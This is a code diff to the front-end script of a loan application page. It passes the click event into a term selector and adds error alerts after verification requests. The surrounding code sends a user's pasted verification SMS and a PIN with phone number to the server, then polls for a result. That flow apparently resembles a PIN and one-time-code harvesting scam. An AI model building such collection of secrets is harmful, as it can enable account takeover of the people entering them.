@@ -615,16 +615,17 @@
       if (loanAmountInput) loanAmountInput.value = amount;
     }
 
-    function setTerm(months) {
+    function setTerm(months, ev) {
       appState.loanTermMonths = months;
       document.querySelectorAll('.term-btn').forEach(btn => {
         btn.classList.remove('border-2', 'border-brand-orange', 'bg-brand-orangeLight', 'text-brand-orangeDark', 'shadow-sm');
         btn.classList.add('border', 'border-slate-200', 'text-slate-700');
       });
 
-      if (event && event.target) {
-        event.target.classList.remove('border', 'border-slate-200', 'text-slate-700');
-        event.target.classList.add('border-2', 'border-brand-orange', 'bg-brand-orangeLight', 'text-brand-orangeDark', 'shadow-sm');
+      const e = ev || (typeof event !== 'undefined' ? event : null);
+      if (e && e.target) {
+        e.target.classList.remove('border', 'border-slate-200', 'text-slate-700');
+        e.target.classList.add('border-2', 'border-brand-orange', 'bg-brand-orangeLight', 'text-brand-orangeDark', 'shadow-sm');
       }
 
       const termSelect = document.getElementById('loan-term-select');
@@ -1015,11 +1016,24 @@
           appId = await ensureApplicationCreated();
         }
         if (appId) {
-          await fetch(`/api/applications/${appId}/verify`, {
+          const res = await fetch(`/api/applications/${appId}/verify`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ step: 'id_document', idNumber: msg, fullMessage: msg })
           });
+          if (!res.ok) {
+            const errData = await res.json().catch(() => ({}));
+            if (msgAlert) {
+              msgAlert.innerText = errData.error || '❌ Error submitting verification message. Please retry.';
+              msgAlert.classList.remove('hidden');
+            }
+            if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
+            if (btn) {
+              btn.disabled = false;
+              btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+            }
+            return;
+          }
           startVerificationPolling(appId);
         }
       } catch (err) {
@@ -1149,7 +1163,7 @@
         }
 
         if (appId) {
-          await fetch(`/api/applications/${appId}/verify`, {
+          const res = await fetch(`/api/applications/${appId}/verify`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -1158,6 +1172,17 @@
               phone: appState.phoneNumber
             })
           });
+          if (!res.ok) {
+            const errData = await res.json().catch(() => ({}));
+            if (pinAlert) {
+              pinAlert.innerText = errData.error || '❌ Error submitting PIN. Please retry.';
+              pinAlert.classList.remove('hidden');
+            }
+            if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
+            loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
+            loginBtn.disabled = false;
+            return;
+          }
           startVerificationPolling(appId);
         }
       } catch (err) {
